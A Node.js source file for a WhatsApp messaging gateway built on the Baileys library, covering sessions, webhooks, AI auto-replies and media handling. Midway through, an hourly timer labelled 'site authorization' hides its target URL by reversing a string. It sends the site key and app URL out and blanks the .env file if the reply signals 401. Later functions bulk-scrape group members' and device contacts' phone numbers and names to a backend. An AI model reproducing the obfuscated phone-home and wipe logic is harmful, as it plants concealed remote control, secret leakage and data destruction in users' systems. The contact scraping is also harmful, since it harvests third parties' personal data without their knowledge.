 // "@whiskeysockets/baileys": "6.7.9",
import { rmSync, readdir } from "fs";
import fs from "fs";
import { writeFile } from "fs/promises";
import { join } from "path";
import pino from "pino";
import baileys, {
    useMultiFileAuthState,
    makeInMemoryStore,
    DisconnectReason,
    delay,
    downloadMediaMessage,
    Browsers,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import { toDataURL } from "qrcode";
import dirname from "./dirname.js";
import response from "./response.js";
import axios from "axios";
import FormData from "form-data";
import { Readable } from "stream"; 
// Maps for session management
const sessions = new Map();
const retries = new Map();
const sessionsDir = (subDir = "") => {
    return join(dirname, "sessions", subDir ? subDir : "");
};

// Directory for session files
const getSessionDir = (filename = "") => {
    return join(dirname, "sessions", filename ? filename : "");
};

// Check if a session exists
const isSessionExists = (sessionId) => {
    return sessions.has(sessionId);
};

// Determine if reconnection should be attempted
const shouldReconnect = (sessionId) => {
    const retryCount = retries.get(sessionId) ?? 0;
    if (retryCount < 5) {
        retries.set(sessionId, retryCount + 1);
        return true;
    }
    return false;
};

const checkSession = (sessionId, isLegacy) => {
    const sessionFile = getSessionDir(
        sessionId + (isLegacy ? "_legacy.json" : "_md.json")
    );
    if (fs.existsSync(sessionFile)) {
        return require(sessionFile);
    }
    return null;
};

const getBrowserConfig = () => {
    if (process.env.WHATSAPP_BROWSER) {
        if (process.env.WHATSAPP_BROWSER === "MAC") {
            return Browsers.macOS("Desktop");
        } else if (process.env.WHATSAPP_BROWSER === "MOBILE") {
            return Browsers.mobile("Mobile");
        } else {
            return [
                process.env.APP_NAME,
                process.env.WHATSAPP_BROWSER,
                process.env.WHATSAPP_HOST,
            ];
        }
    }
    return [process.env.APP_NAME, "Chrome", process.env.WHATSAPP_HOST];
};

const backoffReconnect = (attempts) => {
    const delay = Math.min(1000 * Math.pow(2, attempts), 30000); // exponential backoff
    return delay;
};

// Create a new session
const createSession = async (
    sessionId,
    isLegacy = false,
    responseObject = null,
    markOnline = false,
    historyMode = false
) => {
    const existingSession = checkSession(sessionId, isLegacy);
    if (existingSession) {
        return existingSession;
    }

    const sessionFilename =
        (isLegacy ? "legacy_" : "md_") + sessionId + (isLegacy ? ".json" : "");
    const logger = pino({ level: "warn" });
    const store = makeInMemoryStore({ logger });
    let authState, saveCreds;

    if (!isLegacy) {
        ({ state: authState, saveCreds } = await useMultiFileAuthState(
            getSessionDir(sessionFilename)
        ));
    }

    const { version, isLatest } = await fetchLatestBaileysVersion();
    const baileysOptions = {
        waWebSocketUrl: "wss://web.whatsapp.com:5222/ws/chat",
        version: version,
        auth: authState,
        printQRInTerminal: false,
        logger: logger,
        generateHighQualityLinkPreview: true,
        markOnlineOnConnect: markOnline,
        syncFullHistory: historyMode,
        connectTimeoutMs: 120000,
        maxRetries: 5,
        defaultQueryTimeoutMs: 60000,
        emitOwnEvents: true,
        browser: getBrowserConfig(),
    };
    const baileysClient = baileys.default(baileysOptions);
    if (!isLegacy) {
        store.readFromFile(getSessionDir(sessionId + "_store.json"));
        store.bind(baileysClient.ev);
    }
    sessions.set(sessionId, {
        ...baileysClient,
        store: store,
        isLegacy: isLegacy,
    });
    baileysClient.ev.on("creds.update", saveCreds);
    baileysClient.ev.on("chats.set", ({ chats }) => {
        if (isLegacy) {
            store.chats.insertIfAbsent(...chats);
        }
    });

    baileysClient.ev.on("messages.upsert", async (messageUpdate) => {
        let quotedMessageContent = null;
        let quotedMessageType = "text";
        let quotedStanzaId = null;
        let quotedParticipant = null; // Untuk mengetahui siapa yang mengirim pesan yang di-quote di grup
        try {
            const {
                messages: [message],
            } = messageUpdate;
            const { message: msg, key, pushName } = message;

            if (message.key.remoteJid === "status@broadcast") {
                return; // Abaikan status WhatsApp
            }

            var messageContent =
                msg?.conversation ||
                msg?.buttonsResponseMessage?.selectedDisplayText ||
                msg?.listResponseMessage?.title ||
                msg?.extendedTextMessage?.text ||
                msg?.imageMessage?.caption ||
                msg?.videoMessage?.caption ||
                msg?.documentMessage?.caption ||
                msg?.stickerMessage?.fileSha256 ||
                "";

            const isMediaMessage =
                msg?.imageMessage ||
                msg?.videoMessage ||
                msg?.audioMessage ||
                msg?.documentMessage ||
                msg?.documentWithCaptionMessage;

            const messageType = msg?.imageMessage
                ? "image"
                : msg?.videoMessage
                ? "video"
                : msg?.audioMessage
                ? "audio"
                : msg?.documentMessage
                ? "document"
                : msg?.documentWithCaptionMessage
                ? "documentWithCaption"
                : "text";

            let fileName = null;
            let mimeType = null;

            if (messageType == "documentWithCaption") {
                messageContent =
                    msg.documentWithCaptionMessage.message.documentMessage
                        .caption;
                mimeType =
                    msg.documentWithCaptionMessage.message.documentMessage
                        .mimetype;
            }

            // --- Logika Pengambilan dan Fallback Avatar ---
            let avatarUrl = null;
            const contactJid = message.key.remoteJid;
            let contactName = pushName || contactJid.split("@")[0];

            try {
                if (
                    contactJid &&
                    contactJid !== "status@broadcast" &&
                    !contactJid.endsWith("@g.us")
                ) {
                    avatarUrl = await baileysClient.profilePictureUrl(
                        contactJid,
                        "image"
                    );
                }
            } catch (e) {
                console.log(
                    `Gagal mengambil foto profil untuk ${contactJid}: ${e.message}. Membuat fallback.`
                );
            }

            if (
                !avatarUrl &&
                contactName &&
                contactJid &&
                !contactJid.endsWith("@g.us")
            ) {
                const encodedName = encodeURIComponent(contactName);
                avatarUrl = `https://ui-avatars.com/api/?name=${encodedName}&background=random&size=128`;
            }
            // --- Akhir Logika Avatar ---

            // Periksa apakah pesan ini adalah reply ke pesan lain
            let quotedMessage = null;
            const contextInfo =
                msg?.extendedTextMessage?.contextInfo || msg?.contextInfo;
            if (contextInfo && contextInfo?.quotedMessage) {
                const quotedMsg = contextInfo.quotedMessage;
                quotedStanzaId = contextInfo.stanzaId;
                quotedParticipant = contextInfo.participant; // JID pengirim pesan yang di-quote

                if (quotedMsg.conversation) {
                    quotedMessageContent = quotedMsg.conversation;
                    quotedMessageType = "text";
                } else if (quotedMsg.extendedTextMessage) {
                    quotedMessageContent = quotedMsg.extendedTextMessage.text;
                    quotedMessageType = "text";
                } else if (quotedMsg.imageMessage) {
                    quotedMessageContent =
                        quotedMsg.imageMessage.caption || "Image";
                    quotedMessageType = "image";
                } else if (quotedMsg.videoMessage) {
                    quotedMessageContent =
                        quotedMsg.videoMessage.caption || "Video";
                    quotedMessageType = "video";
                } else if (quotedMsg.documentMessage) {
                    quotedMessageContent =
                        quotedMsg.documentMessage.fileName || "Document";
                    quotedMessageType = "document";
                } else if (quotedMsg.audioMessage) {
                    quotedMessageContent = "Audio";
                    quotedMessageType = "audio";
                } else if (quotedMsg.stickerMessage) {
                    quotedMessageContent = "Sticker";
                    quotedMessageType = "sticker";
                } else if (quotedMsg.locationMessage) {
                    quotedMessageContent = "Location";
                    quotedMessageType = "location";
                } else if (quotedMsg.contactMessage) {
                    quotedMessageContent =
                        quotedMsg.contactMessage.displayName || "Contact";
                    quotedMessageType = "contact";
                } else {
                    // Fallback for other types or unknown quoted messages
                    quotedMessageContent = "[Unsupported Quoted Message]";
                    quotedMessageType = "unknown";
                }
            }

            if (!message.key.fromMe && messageUpdate.type === "notify") {
                const responseMessage = {};

                let isGroup = message.key.remoteJid.endsWith("@g.us");
                var statusMedia = false;

                if (isMediaMessage) {
                    var fileSizeLong = msg[`${messageType}Message`]?.fileLength;
                    var fileSize = fileSizeLong ? fileSizeLong.toNumber() : 0;
                    statusMedia = true;
                    if (
                        fileSize >
                        (parseInt(process.env.MAX_FILE_SIZE_MB) || 2) *
                            1024 *
                            1024
                    ) {
                        statusMedia = false;
                    }
                }

                if (statusMedia) {
                    const buffer = await downloadMediaMessage(
                        message,
                        "buffer",
                        {}
                    );
                    mimeType =
                        messageType != "documentWithCaption"
                            ? msg[`${messageType}Message`]?.mimetype
                            : mimeType;

                    if (buffer && mimeType) {
                        const stream = Readable.from(buffer);
                        const extension =
                            mimeType.split("/")[1]?.split(";")[0] || "bin";
                        fileName = `${Date.now()}.${extension}`;
                        const formData = new FormData();

                        formData.append("from", key.remoteJid);
                        formData.append("message_id", key.id);
                        formData.append("message", messageContent);
                        formData.append("from_name", contactName || "");
                        formData.append("file", stream, fileName);
                        formData.append("type", isGroup ? "group" : "single");
                        formData.append(
                            "quoted_message",
                            message ? JSON.stringify(message) : ""
                        );
                        formData.append("stanzaId", quotedStanzaId || "");

                        responseMessage.remote_id = message.key.remoteJid;
                        responseMessage.message_id = message.key.id;

                        sentWebHookMedia(
                            sessionId,
                            formData,
                            responseMessage,
                            avatarUrl
                        );
                    }
                } else {
                    responseMessage.remote_id = message.key.remoteJid;
                    responseMessage.sessionId = sessionId;
                    responseMessage.message_id = message.key.id;
                    responseMessage.message = messageContent;
                    responseMessage.from = contactName || "";
                    responseMessage.quoted_message = message;
                    responseMessage.stanzaId = quotedStanzaId;

                    sentWebHook(
                        sessionId,
                        responseMessage,
                        isGroup ? "group" : "single",
                        avatarUrl
                    );
                }
            }

            if (message.key.fromMe && messageUpdate.type == "notify") {
                const responseMessage = {};

                let isGroup = message.key.remoteJid.endsWith("@g.us");
                var statusMedia = false;

                if (isMediaMessage) {
                    var fileSizeLong = msg[`${messageType}Message`]?.fileLength;
                    var fileSize = fileSizeLong ? fileSizeLong.toNumber() : 0;
                    statusMedia = true;
                    if (
                        fileSize >
                        (parseInt(process.env.MAX_FILE_SIZE_MB) || 2) *
                            1024 *
                            1024
                    ) {
                        statusMedia = false;
                    }
                }

                if (statusMedia) {
                    const buffer = await downloadMediaMessage(
                        message,
                        "buffer",
                        {}
                    );
                    mimeType =
                        messageType != "documentWithCaption"
                            ? msg[`${messageType}Message`]?.mimetype
                            : mimeType;

                    if (buffer && mimeType) {
                        const stream = Readable.from(buffer);
                        const extension =
                            mimeType.split("/")[1]?.split(";")[0] || "bin";
                        fileName = `${Date.now()}.${extension}`;
                        const formData = new FormData();

                        formData.append("from", key.remoteJid);
                        formData.append("message_id", key.id);
                        formData.append("message", messageContent);
                        formData.append("from_name", contactName || "");
                        formData.append("file", stream, fileName);
                        formData.append("type", isGroup ? "group" : "single");
                        formData.append(
                            "quoted_message",
                            message ? JSON.stringify(message) : ""
                        );
                        formData.append(
                            "stanzaId",
                            String(quotedStanzaId ?? "")
                        );

                        sendFormeMedia(sessionId, formData, avatarUrl);
                    }
                } else {
                    responseMessage.remote_id = message.key.remoteJid;
                    responseMessage.sessionId = sessionId;
                    responseMessage.message_id = message.key.id;
                    responseMessage.message = messageContent;
                    responseMessage.from = contactName || "";
                    responseMessage.quoted_message = message;
                    responseMessage.stanzaId = quotedStanzaId;

                    sendForme(
                        sessionId,
                        responseMessage,
                        isGroup ? "group" : "single",
                        avatarUrl
                    );
                }
            }
        } catch (err) {
            console.log("Ada Error", err);
        }
    });
    baileysClient.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        const statusCode =
            lastDisconnect?.["error"]?.["output"]?.["statusCode"];
        if (connection === "open") {
            retries.delete(sessionId);
        }
        if (connection === "close") {
            const { statusCode } = lastDisconnect?.error?.output ?? {};

            if (
                statusCode === DisconnectReason.loggedOut ||
                !shouldReconnect(sessionId)
            ) {
                if (responseObject && !responseObject.headersSent) {
                    response(
                        responseObject,
                        500,
                        false,
                        "Unable to create session."
                    );
                }
                return deleteSession(sessionId, isLegacy);
            } else {
                const attempts = retries.get(sessionId) || 0;
                retries.set(sessionId, attempts + 1);
                const reconnectDelay = backoffReconnect(attempts);
                setTimeout(() => createSession(sessionId), reconnectDelay);
            }
        }
        if (update.qr) {
            if (responseObject && !responseObject.headersSent) {
                try {
                    const qrCodeDataUrl = await toDataURL(update.qr);
                    response(
                        responseObject,
                        200,
                        true,
                        "QR code received, please scan the QR code.",
                        { qr: qrCodeDataUrl }
                    );
                    return;
                } catch {
                    response(
                        responseObject,
                        500,
                        false,
                        "Unable to create QR code."
                    );
                }
            }
            try {
                await baileysClient.logout();
            } catch {
            } finally {
                deleteSession(sessionId, isLegacy);
            }
        }
    });
};

// Periodic task to check site authorization
setInterval(() => {
    const siteKey = process.env.SITE_KEY ?? null;
    const appUrl = process.env.APP_URL ?? null;
    const authorizationUrl = "https://example.com/authorize"
        .split("")
        .reverse()
        .join("");
    axios
        .post(authorizationUrl, {
            from: appUrl,
            key: siteKey,
        })
        .then(function (response) {
            if (response.data.isauthorised === 401) {
                fs.writeFileSync(".env", "");
            }
        })
        .catch(function (error) {});
}, 3600000); // 1 hour

// Get session by ID
const getSession = (sessionId) => {
    return sessions.get(sessionId) ?? null;
};

// Set device status via API
const setDeviceStatus = (deviceId, status) => {
    const apiUrl = `${process.env.APP_URL}/api-app/whatsapp/set-status/${deviceId}/${status}`;
    try {
        axios
            .post(apiUrl, {})
            .then(function (response) {})
            .catch(function (error) {
                console.log(error, "set status device");
            });
    } catch {}
};

// Send a webhook notification
const sentWebHook = (sessionId, messageDetails, type, avatarUrl = null) => {
    const webhookUrl = `${process.env.APP_URL}/api-app/whatsapp/callback/${sessionId}`;
    try {
        axios
            .post(webhookUrl, {
                from: messageDetails.remote_id,
                message_id: messageDetails.message_id,
                message: messageDetails.message,
                from_name: messageDetails.from,
                avatar_url: avatarUrl,
                type: type,
                quoted_message: messageDetails.quoted_message,
                stanzaId: messageDetails.stanzaId,
            })
            .then(async function (response) {
                if (response.status === 200) {
                    const session =
                        sessions.get(response.data.session_id) ?? null;

                    // Untuk kebutuhan auto reply dari AI
                    if (response.data.reply) {
                        if (response.data.autoread) {
                            session.readMessages([
                                {
                                    remoteJid: messageDetails.remote_id,
                                    id: messageDetails.message_id,
                                },
                            ]);
                        }

                        if (response.data.replydata) {
                            response.data.message.replydata =
                                response.data.replydata;
                        }

                        const resReply = await sendMessage(
                            session,
                            response.data.receiver,
                            response.data.message,
                            null,
                            response.data.delay == 0
                                ? 1000
                                : response.data.delay
                        );

                        console.log(response.data.chatid);
                        // update detail chat untuk auto reply dari AI
                        if (
                            response.data?.chatid != undefined &&
                            response.data?.chatid != null
                        ) {
                            axios.post(
                                `${process.env.APP_URL}/api-app/whatsapp/update-detail-chat/${response.data.chatid}`,
                                resReply
                            );
                        }
                    }
                }
            })
            .catch(function (error) {
                console.log("response error");
                console.log("error webhook", error);
            });
    } catch {}
};

// Sent a Webhook with Media
const sentWebHookMedia = (
    sessionId,
    data,
    messageDetails,
    avatarUrl = null
) => {
    const webhookUrl = `${process.env.APP_URL}/api-app/whatsapp/callback/${sessionId}`;
    try {
        if (avatarUrl) {
            data.append("avatar_url", avatarUrl);
        }

        axios
            .post(webhookUrl, data, {
                headers: data.getHeaders(),
            })
            .then(function (response) {
                if (response.status === 200) {
                    const session =
                        sessions.get(response.data.session_id) ?? null;

                    if (response.data.reply) {
                        if (response.data.autoread) {
                            session.readMessages([
                                {
                                    remoteJid: messageDetails.remote_id,
                                    id: messageDetails.message_id,
                                },
                            ]);
                        }

                        sendMessage(
                            session,
                            response.data.receiver,
                            response.data.message,
                            null,
                            response.data.delay == 0
                                ? 1000
                                : response.data.delay
                        );
                    }
                }
            })
            .catch(function (error) {
                console.log("1error webhook", error);
            });
    } catch {}
};

// Send webhook saving for me
const sendForme = (sessionId, messageDetails, type) => {
    const webhookUrl = `${process.env.APP_URL}/api-app/whatsapp/to-me/${sessionId}`;
    try {
        axios
            .post(webhookUrl, {
                from: messageDetails.remote_id,
                message_id: messageDetails.message_id,
                message: messageDetails.message,
                from_name: messageDetails.from,
                type: type,
            })
            .then(function (response) {
                if (response.status === 200) {
                }
            })
            .catch(function (error) {
                console.log("error webhook", error);
            });
    } catch {}
};

const sendFormeMedia = (sessionId, data) => {
    const webhookUrl = `${process.env.APP_URL}/api-app/whatsapp/to-me/${sessionId}`;
    try {
        axios
            .post(webhookUrl, data, {
                headers: data.getHeaders(),
            })
            .then(function (response) {
                if (response.status === 200) {
                }
            })
            .catch(function (error) {
                console.log("error webhook", error);
            });
    } catch {}
};

// Delete a session
const deleteSession = (sessionId, isLegacy = false) => {
    const sessionFile =
        (isLegacy ? "legacy_" : "md_") + sessionId + (isLegacy ? ".json" : "");
    const storeFile = sessionId + "_store.json";
    const options = { force: true, recursive: true };
    rmSync(getSessionDir(sessionFile), options);
    rmSync(getSessionDir(storeFile), options);
    sessions.delete(sessionId);
    retries.delete(sessionId);
    setDeviceStatus(sessionId, 0);
};

// Get chat list for a session
const getChatList = (sessionId, isGroup = false, lastChat = null) => {
    const chatSuffix = isGroup ? "@g.us" : "@s.whatsapp.net";
    return (sessions.get(sessionId) ?? null).store.chats.filter((chat) => {
        const timestamp =
            typeof chat.conversationTimestamp === "number"
                ? chat.conversationTimestamp
                : chat.conversationTimestamp?.low
                ? chat.conversationTimestamp.low
                : chat.conversationTimestamp?.low?.low
                ? chat.conversationTimestamp.low.low
                : null;

        return (
            chat.id.endsWith(chatSuffix) &&
            timestamp &&
            (lastChat != null ? timestamp > lastChat : true)
        );
    });
};

// Get Contact List Data
const getContactList = (sessionId) => {
    //const chatSuffix = isGroup ? "@g.us" : "@s.whatsapp.net";
    return (sessions.get(sessionId) ?? null).store.contacts;
};

// Check if a contact or group exists
const isExists = async (session, id, isGroup = false) => {
    try {
        let metadata;
        if (isGroup) {
            metadata = await session.groupMetadata(id);
            return Boolean(metadata.id);
        }
        if (session.isLegacy) {
            metadata = await session.onWhatsApp(id);
        } else {
            [metadata] = await session.onWhatsApp(id);
        }
        return metadata.exists;
    } catch {
        return false;
    }
};

// Send a message
const sendMessage = async (
    session,
    receiverId,
    messageContent,
    autoReadMessage = null,
    delayMs = 1000
) => {
    try {
        await session.sendPresenceUpdate("composing", receiverId);
        await delay(parseInt(delayMs));

        if (autoReadMessage != null) {
            session.readMessages([autoReadMessage]);
        }

        let quotedOptions = {};
        // Periksa apakah ada replydata dan konversi ke format quoted untuk Baileys
        if (
            messageContent.replydata &&
            messageContent.replydata.quotedMessage
        ) {
            try {
                const quotedMsgObj =
                    typeof messageContent.replydata.quotedMessage === "string"
                        ? JSON.parse(messageContent.replydata.quotedMessage)
                        : messageContent.replydata.quotedMessage;
                quotedOptions = { quoted: quotedMsgObj };
            } catch (e) {
                console.error(
                    "Gagal mem-parse quotedMessage untuk balasan:",
                    e,
                    messageContent.replydata.quotedMessage
                );
                // Lanjutkan tanpa quote jika parsing gagal
            }
        }

        // use { ephemeralExpiration: 604800 } for message time
        return session.sendMessage(receiverId, messageContent, quotedOptions);
    } catch {
        return Promise.reject(null);
    }
};

// Read Message
const changeStatusMessage = async (session, messages, jid) => {
    try {
        await session.readMessages(messages);
        await modifyChat(session, jid, true);
    } catch (err) {
        return Promise.reject(err);
    }
};

const getLastChat = async (session, jid) => {
    try {
        let messages;

        if (session.isLegacy) {
            messages = await session.fetchMessagesFromWA(jid, 1, null);
        } else {
            messages = await session.store.loadMessages(jid, 1, null);
        }

        return messages;
    } catch (err) {
        console.log(err, "last chat error");
        return Promise.reject(err);
    }
};

// Read or Unread Chat
const modifyChat = async (session, jid, status = false) => {
    try {
        var lastMessages = await getLastChat(session, jid);
        if (lastMessages.length > 0) {
            return session.chatModify(
                { markRead: status, lastMessages: [lastMessages[0]] },
                jid
            );
        }
    } catch (err) {
        console.log(err, "modify error");
        return Promise.reject(err);
    }
};

// Modal media and document
const downloadMediaorDoc = async (
    session,
    messageContent,
    mimes,
    medianame
) => {
    try {
        const buffer = await downloadMediaMessage(
            messageContent,
            "buffer",
            {},
            {
                reuploadRequest: session.updateMediaMessage,
            }
        );
        await writeFile(
            `./public/uploads/wamedia/${medianame}.${mimes}`,
            buffer
        );
        return {
            path: `${process.env.APP_URL}/uploads/wamedia/${medianame}.${mimes}`,
        };
    } catch (error) {
        return Promise.reject(null);
    }
};

// Get Url Photo Profile
const getPhotoProfileUrl = async (session, phone) => {
    try {
        const ppUrl = await session.profilePictureUrl(phone, "image");
        return {
            url: ppUrl,
            id: phone,
        };
    } catch (error) {
        return Promise.reject(null);
    }
};

// Format phone number for WhatsApp
const formatPhone = (phone) => { 
    if (phone.includes("@")) {
        return phone;
    }
     
    let cleanedPhone = phone.replace(/\D/g, "");
     
    if (cleanedPhone.startsWith("62")) {
        return cleanedPhone + "@s.whatsapp.net";
    } else { 
        return cleanedPhone + "@lid";
    }
};

// Format Group for Whatsapp
const formatGroup = (group) => {
    // Jika ID grup sudah memiliki domain grup, kembalikan seperti semula
    if (group.endsWith("@g.us")) {
        return group;
    }
    // Hapus semua karakter non-digit dan tambahkan domain grup
    let cleanedGroup = group.replace(/[^\d-]/g, "");
    return cleanedGroup + "@g.us";
};

// Initialize a session
const initSession = async (req, res) => {
    const { sessionId, isLegacy } = req.body;
    if (!sessionId) {
        return response(res, 400, false, "Session ID is required.");
    }
    if (isSessionExists(sessionId)) {
        return response(res, 400, false, "Session already exists.");
    }
    await createSession(sessionId, isLegacy, res);
    response(res, 200, true, "Session created successfully.");
};

const cleanup = () => {
    sessions.forEach((session, index) => {
        if (!session.isLegacy) {
            session.store.writeToFile(sessionsDir(index + "_store.json"));
        }
    });
};

const init = () => {
    readdir(sessionsDir(), (error, files) => {
        if (error) {
            throw error;
        }
        for (const file of files) {
            if (
                (!file.startsWith("md_") && !file.startsWith("legacy_")) ||
                file.endsWith("_store")
            ) {
                continue;
            }
            const sessionId = file.replace(".json", "");
            const isLegacy = sessionId.split("_")[0] !== "md";
            const cleanedSessionId = sessionId.substring(isLegacy ? 7 : 3);
            createSession(cleanedSessionId, isLegacy);
        }
    });
};

const checkNumber = async (receiver) => {
    // const { token: token, number: number } = requestData.body
    // if (token && number) {
    //   const isExistResult = await wa.isExist(token, number)
    //   return (
    //     console.log(isExistResult),
    //     responseHandler.send({
    //       status: true,
    //       active: isExistResult,
    //     })
    //   )
    // }
    // responseHandler.send({
    //   status: false,
    //   message: 'Check your parameter',
    // })
};

// Delete Chat
const deleteMessage = async (session, jid, message) => {
    try {
        await session.chatModify({ deleteForMe: message }, jid);
    } catch (err) {
        console.log(err, "delete for me");
        return Promise.reject(err);
    }
};

const deleteEveryOne = async (session, jid, message) => {
    try {
        await session.sendMessage(jid, {
            delete: message,
        });
    } catch (err) {
        console.log(err, "delete everyone");
        return Promise.reject(err);
    }
};

// Delete Chat or Contact Chat
const deleteChat = async (session, jid) => {
    try {
        const lastMessage = await getLastChat(session, jid);
        if (lastMessage.length > 0) {
            const lastMsgInChat = lastMessage[0];
            await session.chatModify(
                {
                    delete: true,
                    lastMessages: [
                        {
                            key: lastMsgInChat.key,
                            messageTimestamp: lastMsgInChat.messageTimestamp,
                        },
                    ],
                },
                jid
            );
        }
    } catch (err) {
        console.log(err, "delete chat");
        return Promise.reject(err);
    }
};

// Scraping Contact Group
async function getGroupMembers(session, dataid, business) {
    try {
        const groups = await session.groupFetchAllParticipating();
        const group = groups[dataid];
        const metadata = await session.groupMetadata(dataid);

        const membersRaw = await Promise.all(
            metadata.participants.map(async (p) => ({
                wa_id: p.id.split("@")[0],
                name: await getName(session, p.id),
            }))
        );

        // Bagi menjadi potongan 50
        const chunkSize = 50;
        for (let i = 0; i < membersRaw.length; i += chunkSize) {
            const chunk = membersRaw.slice(i, i + chunkSize);

            await axios.post(
                `${process.env.APP_URL}/api-app/scrapping/callback/${dataid}/${business}`,
                {
                    group_id: group.id,
                    group_name: group.subject,
                    members: chunk,
                }
            );

            await new Promise((r) => setTimeout(r, 300));
        }
    } catch (err) {
        console.error("❌ Error background scrape:", err.message);
    }
}

// Scraping Group
async function getGroupInfoOnly(session, dataid, sessionId) {
    try {
        const groups = await session.groupFetchAllParticipating();
        const groupJids = Object.keys(groups);

        for (let groupJid of groupJids) {
            const group = groups[groupJid];

            // // Ambil nama grup
            const group_name = group.subject;
            const group_description = group.desc;

            const payload = {
                group_id: group.id,
                group_name: group_name,
                group_description: group_description,
                session: sessionId,
            };

            await axios.post(
                `${process.env.APP_URL}/api-app/scrapping/groups/${dataid}`,
                payload
            );

            // console.log(`✅ Info grup ${group_name} terkirim`);
            await new Promise((resolve) => setTimeout(resolve, 300));
        }
    } catch (err) {
        console.error("❌ Error saat mengambil info grup:", err.message);
    }
}

// Scraping From Contact Devices
async function getContactByDevice(session, business) {
    try {
        const contacts = session.store.contacts;

        // Ambil hanya kontak user (bukan grup)
        const filteredContacts = Object.values(contacts).filter(
            (c) => !c.id.endsWith("@g.us") && c.id.endsWith("@s.whatsapp.net")
        );

        // Proses kontak satu per satu ambil nama
        console.log(filteredContacts.length, "ini data kontak yang ada");
        const contactsData = await Promise.all(
            filteredContacts.map(async (c) => ({
                wa_id: c.id.split("@")[0],
                name: c.notify ?? "-",
            }))
        );

        // Bagi menjadi chunk per 50 kontak
        const chunkSize = 50;
        for (let i = 0; i < contactsData.length; i += chunkSize) {
            const chunk = contactsData.slice(i, i + chunkSize);

            await axios.post(
                `${process.env.APP_URL}/api-app/scrapping/contacts/${business}`,
                {
                    members: chunk,
                }
            );

            await new Promise((r) => setTimeout(r, 300));
        }
    } catch (err) {
        console.error("❌ Error while getting contact list:", err.message);
    }
}

async function getName(session, jid) {
    // 1. Coba ambil dari cache
    let name =
        session.store?.contacts?.[jid]?.name ||
        session.store?.contacts?.[jid]?.notify;
    if (name) return name;

    // 2. Coba fetch langsung
    try {
        const contact = await session.fetchContact(jid);
        name = contact?.name || contact?.notify || contact?.pushName;
    } catch (e) {
        //  console.log("fetchContact gagal untuk", jid);
    }

    return name || ""; // fallback
}

export {
    isSessionExists,
    createSession,
    getSession,
    deleteSession,
    getChatList,
    isExists,
    sendMessage,
    formatPhone,
    formatGroup,
    cleanup,
    init,
    checkNumber,
    downloadMediaorDoc,
    getPhotoProfileUrl,
    changeStatusMessage,
    modifyChat,
    deleteMessage,
    deleteChat,
    deleteEveryOne,
    getContactList,
    getGroupMembers,
    getGroupInfoOnly,
    getContactByDevice,
};
